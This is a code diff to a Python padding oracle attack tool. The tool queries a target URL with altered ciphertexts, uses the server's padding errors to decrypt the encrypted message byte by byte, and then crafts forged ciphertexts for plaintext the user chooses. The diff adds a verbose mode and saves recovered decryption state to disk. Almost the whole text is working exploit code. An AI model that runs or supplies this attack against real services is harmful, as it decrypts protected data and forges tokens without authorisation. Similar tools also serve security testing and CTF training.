@@ -97,15 +97,16 @@ def fuzzCk(b, k=0):
 
             # verify wether or not the oracle validated the padding
             pad_err = paddingError(getRequest(new_cypher))
-            s = f"Padding Error: {pad_err} | {printable_cypher} | Byte: {BLOCK_SIZE-pad_step+1}\n"
-            os.system('cls' if os.name == 'nt' else 'clear')
-            print(f"{to_print}{s}")
+            if VERBOSE:
+                s = f"Padding Error: {pad_err} | {printable_cypher} | Byte: {BLOCK_SIZE-pad_step+1}\n"
+                os.system(CLEAR)
+                print(f"{to_print}{s}")
             if not pad_err: # and val != current_val:
                 ok = True
                 break
         
         to_print += f"{GREEN if ok else RED} Valid padding: {not pad_err} | {new_cypher} | {val if ok else None} | Byte {BLOCK_SIZE-pad_step+1}{WHITE}\n"
-        os.system('cls' if os.name == 'nt' else 'clear')
+        os.system(CLEAR)
         if ok:
             guess(c=current_val, x=val, pad=pad_step, Pn=Pn, Dn=Dn)
             to_print += f"Found d[{BLOCK_SIZE-pad_step+1}]={hex(Dn[BLOCK_SIZE-pad_step])} and p[{BLOCK_SIZE-pad_step+1}]={hex(Pn[BLOCK_SIZE-pad_step])}\n"
@@ -147,42 +148,67 @@ def buildBlocks(desired_plain, DNs, n, plain_len):
 
 
 if __name__ == "__main__":
-    URL, method, DATA, s, BLOCK_SIZE, PADDING_ERROR = get_args()
-
-    if (METHOD:=method.upper()) not in ["GET", "POST"]:
-        log_error("Invalid method, use get or post (upper or lower case)")
-        exit(1)
-
-    if METHOD == 'POST':
-        print("No implemented yet.")
-        exit()
+    URL, method, DATA, s, BLOCK_SIZE, PADDING_ERROR, VERBOSE = get_args()
 
     print(ban)
     print("Taille des blocks: ", BLOCK_SIZE)
     print("Cypher sample: ", s)
     print("Blocks: ", b:=getBlocks(s))
 
-    input("Press enter to attack...")
-
-    n = len(b)
-    message = ""
-    saved_datas = {
+    data = None
+    saved_data = {
         "DNs": [],
         "PNs": []
     }
-    _b = ["00"*16] + b
-    try:
-        for i in range(0, n):
-            sub_b = _b[0:i+2]
-            Pn, Dn = fuzzCk(b=sub_b, k=i)
-            saved_datas["DNs"].append(Dn)
-            saved_datas["PNs"].append(Pn)
-            
+ 
+    if (h:=getFileName(URL, s)) in os.listdir("save"):
+        log_success(f"Found saved data with this url and data: save/{h}")
+        o = input("Do you want to use saved data ? (y/n) ")
+        if o == 'y':
+            data = read_data(file_name=h)
+    
+    message = ""
+    if not data:
+        if (METHOD:=method.upper()) not in ["GET", "POST"]:
+            log_error("Invalid method, use get or post (upper or lower case)")
+            exit(1)
+
+        if METHOD == 'POST':
+            print("No implemented yet.")
+            exit(1)
+
+        input("Press enter to attack...")
+        CLEAR = 'cls' if os.name == 'nt' else 'clear'
+        os.system(CLEAR)
+
+        n = len(b)
+        _b = ["00"*16] + b
+        try:
+            for i in range(0, n):
+                sub_b = _b[0:i+2]
+                Pn, Dn = fuzzCk(b=sub_b, k=i)
+                saved_data["DNs"].append(Dn)
+                saved_data["PNs"].append(Pn)
+                
+                for v in Pn:
+                    message += chr(v)
+
+            log_success(f"----------------------- DECRYPTED MESSAGE: {message} -----------------------")
+            print("Saving data...")
+            save_data(saved_data, URL, s)
+
+        except KeyboardInterrupt:
+            print("\nX-X ouch")
+            exit(0)
+
+    else:
+        saved_data = data
+        for Pn in saved_data["PNs"]:
             for v in Pn:
                 message += chr(v)
+        log_success(f"----------------------- DECRYPTED MESSAGE: {message} -----------------------")
 
-        print(f"{GREEN} ----------------------- DECRYPTED MESSAGE: {message} -----------------------{WHITE}")
-
+    try:
         while True:
             craft = input("Do you want to craft a custom cypher? Enter your plaintext or type '\\q' to quit: ")
             if craft.lower() == "\\q":
@@ -192,9 +218,9 @@ if __name__ == "__main__":
                 desired_plain = craft
                 plain_len = len(desired_plain)
                 n_blocks_needed = ceil(plain_len / 16)
-                if n_blocks_needed < len(saved_datas["DNs"]):
-                    C1 = buildBlocks(desired_plain, saved_datas["DNs"][:n_blocks_needed], n_blocks_needed, plain_len)
-                    C2 = b[:-1]
+                if n_blocks_needed < len(saved_data["DNs"]):
+                    C1 = buildBlocks(desired_plain, saved_data["DNs"][:n_blocks_needed], n_blocks_needed, plain_len)
+                    C2 = b[n_blocks_needed:n_blocks_needed+1]
                     new_cypher = blockToCypher(C1 + C2)
                     print(f"Crafted Cypher: {new_cypher}")
                 else:
